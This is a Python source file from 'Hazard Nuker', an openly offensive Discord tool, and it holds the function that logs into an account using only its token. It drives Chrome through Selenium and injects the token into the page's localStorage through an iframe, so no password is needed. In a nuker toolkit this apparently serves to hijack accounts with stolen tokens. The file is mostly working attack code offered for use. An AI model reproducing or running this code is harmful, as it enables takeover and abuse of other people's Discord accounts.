# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import os
import Hazard

from time import sleep
from selenium import webdriver
from colorama import Fore

from util.plugins.common import Chrome_Installer

def TokenLogin(token):
    print(f"{Fore.GREEN}Checking Chromedriver. . .")
    sleep(0.5)
    if os.path.exists(os.getcwd()+"\\chromedriver.exe"):
        print("Chromedriver already exists, continuing. . .")
        sleep(0.5)
    else:
        print(f"{Fore.RED}Chromedriver not found! Installing it for you")
        try:
            Chrome_Installer()
        except Exception as e:
            print(f"{Fore.RED}Failed to download driver. . .\nError: {e}")
            print(f"If this keeps happening go to https://github.com/Rdimo/Hazard-Nuker#9-log-into-an-account and install the chromedriver manually")
            sleep(5)
            Hazard.main()

    try:
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Chrome(options=opts)
        driver.get("https://discordapp.com/login")
        driver.execute_script("""
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
                location.reload();
               """ % (token))
        Hazard.main()
    except Exception as e:
        print(f"{Fore.RED}Sorry Hazard had trouble logging into the account")
        print(f"Ignoring error: {e}")
        sleep(5)
        Hazard.main()